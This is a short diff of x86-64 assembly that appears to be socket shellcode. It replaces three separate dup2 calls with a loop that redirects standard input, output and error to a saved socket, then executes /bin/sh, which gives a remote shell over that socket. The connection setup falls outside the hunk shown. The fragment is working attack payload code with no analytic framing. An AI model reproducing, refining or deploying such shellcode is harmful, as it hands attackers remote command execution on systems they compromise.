@@ -45,25 +45,14 @@ _start:
 
 	mov rdi, rax			;; save sock
 
-	;; dup2(sock, 0)
-	xor rsi, rsi
+	;; dup2(sock, [0-2])
+_dup2:
 	xor rax, rax
-	mov al, 33			;; rax = 33 (dup2)
+	mov al, 33
 	syscall
-
-	;; dup2(sock, 1)
-	inc al
-	mov rsi, rax
-	xor rax, rax
-	mov al, 33			;; rax = 33 (dup2)
-	syscall
-
-	;; dup2(sock, 2)
-	inc al
-	mov rsi, rax
-	xor rax, rax
-	mov al, 33			;; rax = 33 (dup2)
-	syscall
+	inc rsi
+	cmp al, 2
+	jne _dup2
 
 	;; execve("/bin/sh", 0, 0)
 	mov rax, 0x68732f6e69622fff	;; rax = "\xFF/bin/sh"
